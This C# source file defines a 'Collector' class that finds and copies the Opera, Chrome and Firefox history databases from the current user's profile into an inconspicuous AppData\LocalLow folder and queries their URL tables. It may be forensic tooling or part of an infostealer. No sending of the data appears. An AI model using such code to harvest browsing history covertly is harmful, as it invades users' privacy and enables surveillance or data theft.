using System;
using System.Collections.Generic;
using System.IO;


namespace Collector
{
    class Locator
    {
     
        string source;
        string destination;
        static string username = Environment.UserName;
        static string domain = Environment.UserDomainName;
        string user = Username(username,domain);

        // Evaluate if directory exists
        public static bool dirExists(string dir)
        {
            if (Directory.Exists(dir))
            {
                return true;
            }
            return false;
        }

        // Get the exact path of current user
        public static string Username(string username, string domain)
        {
            if(dirExists(@"C:\Users\" + username + "." + domain))
            {
                return username + "." + domain;
            }
            // return username;
            else
            {
                return username;
            }
           
        }       
        
        public void OperaLocator()
        {
            // Opera source file and destination file
            string sourceOpera = @"C:\Users\" + user + @"\AppData\Roaming\Opera Software\Opera Stable\History";
            source = sourceOpera;
            destination = @"C:\Users\" + user + @"\AppData\LocalLow\h_opera";         
            new FileCopy(source, destination);
            new FileReader("select * from urls", destination);
        }

        public void ChromeLocator()
        {
            // Chrome source file and destination file
            string sourceChrome = @"C:\Users\" + user + @"\AppData\Local\Google\Chrome\User Data\Default\History";
            destination = @"C:\Users\" + user + @"\AppData\LocalLow\h_chrome";
            source = sourceChrome;           
            new FileCopy(source,destination);
            new FileReader("select * from urls", destination);
        }
    
        public void MozillaLocator()
        {
            // Mozilla source file and destination file
            // Mozilla Firefox has a unique naming of application data
            string partial_path = ".default";
            string sourceMozilla = @"C:\Users\" + user + @"\AppData\Roaming\Mozilla\Firefox\Profiles\";

             DirectoryInfo dirInfo = new DirectoryInfo(sourceMozilla);
            // Get directories containg .default word
             DirectoryInfo[] dir = dirInfo.GetDirectories("*" + partial_path);
             List<string> unique_dir = new List<string>();
            
             foreach (DirectoryInfo foundDir in dir)
             {
               unique_dir.Add(foundDir.ToString());             
             }
            // Console.WriteLine(unique_dir[0]);
            // build the origin of the file
            source = sourceMozilla + unique_dir[0] + @"\places.sqlite";
            destination = @"C:\Users\" + user + @"\AppData\LocalLow\h_mozilla";
            new FileCopy(source, destination);
            new FileReader("select * from moz_places", destination);
        }
     
    }

}
            